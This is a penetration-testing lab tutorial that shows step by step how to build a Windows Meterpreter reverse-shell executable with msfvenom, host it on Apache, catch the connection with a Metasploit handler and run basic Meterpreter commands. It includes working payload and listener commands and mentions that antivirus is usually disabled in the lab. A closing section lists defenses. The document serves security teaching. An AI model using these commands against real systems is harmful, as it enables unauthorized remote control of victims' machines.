# 🛡️ Practical 1 – Windows Reverse Shell (Metasploit + msfvenom)

Today we will understand a **basic penetration testing lab practical** where we will:
✔ Generate a payload
✔ Host it on a web server
✔ Set up a Metasploit handler
✔ Establish a remote Meterpreter session

⚠️ This practical is only for an **authorized lab environment (Kali + Windows VM)**.

---

# 1️⃣ Basic Concept 📌

## 📌 What is a Reverse Shell?

A reverse shell is a connection where:

👉 The target machine connects to the attacker (not vice versa)

Meaning:

* Attacker "waits"
* Target "initiates the connection"

---

## 🧠 Simple Flow

```
Attacker (Kali)  <------  Target (Windows)
     Listener           Reverse Connection
```

---

# 2️⃣ Lab Setup 🖥️

## 📌 Required Systems:

✔ Kali Linux (Attacker)
✔ Windows VM (Target)
✔ Same network (VirtualBox NAT / Host-only)

---

## 🔎 Network Check

Both machines should be on the same network.

Check Kali IP:

```bash
ip a
```

Example:

```
192.168.1.15
```

👉 This is what we call **LHOST**.

---

# 3️⃣ Payload Generation 🧨 (msfvenom)

## 📌 Purpose:

To create an executable file for Windows that initiates a reverse connection when run.

---

## ⚙️ Command:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.15 LPORT=4444 -f exe -o malware.exe
```

---

## 🧠 Breakdown:

| Parameter                       | Meaning               |
| ------------------------------- | --------------------- |
| -p                              | Payload type          |
| windows/meterpreter/reverse_tcp | Reverse shell payload |
| LHOST                           | Attacker IP           |
| LPORT                           | Listening port        |
| -f exe                          | Windows executable    |
| -o malware.exe                  | Output file           |

---

## 📌 Output:

✔ malware.exe is generated
✔ This is the actual payload file

---

# 4️⃣ Web Server Setup 🌐

## 📌 Purpose:

To host the payload so the target can download it.

---

## 📁 Move to Apache Directory:

```bash
cd /var/www/html
```

```bash
mv ~/malware.exe /var/www/html/
```

---

## 🚀 Start Apache Server:

```bash
sudo service apache2 start
```

Check status:

```bash
sudo service apache2 status
```

---

## 🌍 Access Payload:

```
http://192.168.1.15/malware.exe
```

✔ If it downloads successfully → hosting is successful

---

# 5️⃣ Metasploit Framework Start ⚙️

## 📌 Launch Console:

```bash
msfconsole
```

---

# 6️⃣ Handler Setup 🎯

## 📌 Purpose:

To receive the incoming reverse connection.

---

## ⚙️ Steps:

```bash
use exploit/multi/handler
```

---

## 📌 Set Payload:

```bash
set payload windows/meterpreter/reverse_tcp
```

---

## 🌐 Network Configuration:

```bash
set LHOST 192.168.1.15
set LPORT 4444
```

---

# 7️⃣ Start Listener ▶️

```bash
exploit
```

or

```bash
run
```

---

## 📌 Status:

✔ Metasploit is now in waiting mode
✔ Waiting for a connection

---

# 8️⃣ Target Execution 💻

## 📌 Process:

On the Windows VM:

1. Open browser
2. Open URL:

```
http://192.168.1.15/malware.exe
```

3. Download the file
4. Run it

---

## ⚠️ Important:

Modern Windows:

* Defender may block it
* Unknown exe warning will appear

(Usually disabled in lab environments)

---

# 9️⃣ Session Establishment 🔗

If everything is successful:

Metasploit will show output:

```
Meterpreter session opened
```

---

# 🔟 Basic Meterpreter Commands 🧠

## 📌 System Info:

```bash
sysinfo
```

## 📌 Current User:

```bash
getuid
```

## 📌 Check Directory:

```bash
pwd
```

## 📌 List Files:

```bash
ls
```

---

# 📌 Overall Attack Flow Summary 🔥

```
1. Check IP (LHOST)
2. Create payload (msfvenom)
3. Set up web server (Apache)
4. Host the payload
5. Start Metasploit handler
6. Target downloads and executes
7. Reverse connection established
8. Meterpreter session opens
```

---

# 🛡️ Security Perspective (Very Important)

## 📌 Why attacks fail today:

✔ Antivirus detection
✔ Firewall blocking
✔ Network isolation
✔ Payload signature detection

---

## 📌 Defense Methods:

✔ Don't run unknown files
✔ Use updated antivirus
✔ Disable unnecessary downloads
✔ Network monitoring tools

---

# 🎯 Interview Key Points

✔ Difference between reverse shell and bind shell
✔ Purpose of msfvenom
✔ Meterpreter features
✔ Why LHOST is important
✔ Why the payload must match the handler

---

# 🏁 Final Thought

This practical is a **foundation concept** in cyber security:

👉 Payload creation
👉 Network communication
👉 Remote session handling

If you understand this →
Next level penetration testing becomes easier 🔥